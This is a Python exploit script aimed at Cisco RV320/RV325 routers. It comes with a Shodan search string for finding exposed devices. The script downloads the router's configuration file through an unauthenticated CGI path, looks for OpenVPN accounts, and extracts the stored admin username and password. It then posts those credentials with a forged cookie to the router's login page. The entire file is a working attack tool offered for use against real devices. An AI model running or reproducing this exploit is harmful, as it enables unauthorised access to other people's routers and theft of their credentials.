#Shodan Dork:"ssl:RV325" or "ssl:RV320" 
import requests
import urllib3

def search(ip):
    string='[OPENVPN_ACCOUNT]'
    index = 0
    flag = 0
    file= open("cisco.exp")  
    for line in file:
        index += 1  
      
        if string in line:        
            flag = 1
            break 
       
          

    if flag == 0: 
        print('OpenVPN not found on this router!', string)
        getcreds(ip)       

           

    elif flag == 1: 
        print('OpenVPN Found', string, 'Found In Line', index ,'\n') 
        getcreds(ip) 
    else:
      print('error')          
    file.close() 

def getfile(ip):
    url = 'https://%s/cgi-bin/config.exp'%ip
    print(url)
    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass
    page = requests.get(url, verify=False)
    open('cisco.exp', 'wb').write(page.content)

def getcreds(ip):
    file = open("cisco.exp")       
    for index, line in enumerate(file):
        if ( index == 28):
            username= line
            cusername= username[9:len(username)-1]
            
                       
        elif( index == 29):
            password=line
            cpass=password[7:len(password)-1]         
            break
        
    print(cusername,cpass)       
        
    postman(cusername,cpass,ip)
  
def postman(fuser,fpass,ip):
    input
    url = "https://%s/cgi-bin/userLogin.cgi"%ip    
    payload='login=true&portalname=CommonPortal&password_expired=0&auth_key=1964300002&auth_server_pw=AA==&md5_old_pass=&langName=ENGLISH,Deutsch,Espanol,Francais,Italiano&changelanguage=&submitStatus=0&pdStrength=0&username=%s&password=%s&LanguageList=ENGLISH&current_password=&new_password=&re_new_password='%(fuser, fpass)
    #print(payload)
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'https://%s:443'%ip,
    'Referer': 'https://%s:443/'%ip,
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'Cookie': 'mlap=RGVmYXVsdDE6Ojo6YWRtaW5pc3RyYXRvcg=='
    }
    requests.packages.urllib3.disable_warnings()
    requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    try:
        requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
    except AttributeError:
        pass
    response = requests.request("POST", url, headers=headers, data=payload,verify=False)
    #cleanresponse=(response.headers)    
    print(response.headers)
    cookie=input("Enter cookie for test")  
  

        

ip = input('Please enter the Ip Address!\n')
print('OpenVPN finder in Cisco RV320/RV325!\n')
getfile(ip)
print('Config.exp file sucessfully downloaded!\n')
search(ip)

    
